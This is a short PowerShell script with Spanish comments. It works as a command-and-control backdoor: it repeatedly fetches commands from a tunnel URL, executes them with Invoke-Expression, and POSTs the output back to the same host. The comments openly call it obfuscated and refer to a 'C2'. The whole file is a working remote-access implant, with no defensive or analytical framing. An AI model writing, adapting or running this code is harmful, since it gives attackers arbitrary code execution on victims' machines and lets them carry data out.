# Ofuscación básica de variables
$s='https://480c88b879ff27c7-84-126-116-174.serveousercontent.com'
$t=3
$e={iex $args[0] 2>&1 | Out-String}

# Bucle principal con manejo de errores mejorado
while($true){
    try{
        # Obtener comando del C2
        $c=(Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 5).Content
        
        # Si hay comando válido, ejecutarlo
        if($c -and $c -ne 'OK'){
            # Ejecutar comando y capturar salida
            $r=&$e $c
            
            # Enviar resultado de vuelta
            Invoke-WebRequest -Uri $s -Method POST -Body $r -UseBasicParsing -TimeoutSec 10
        }
    }catch{
        # Si falla la conexión, esperar más tiempo
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds $t
}
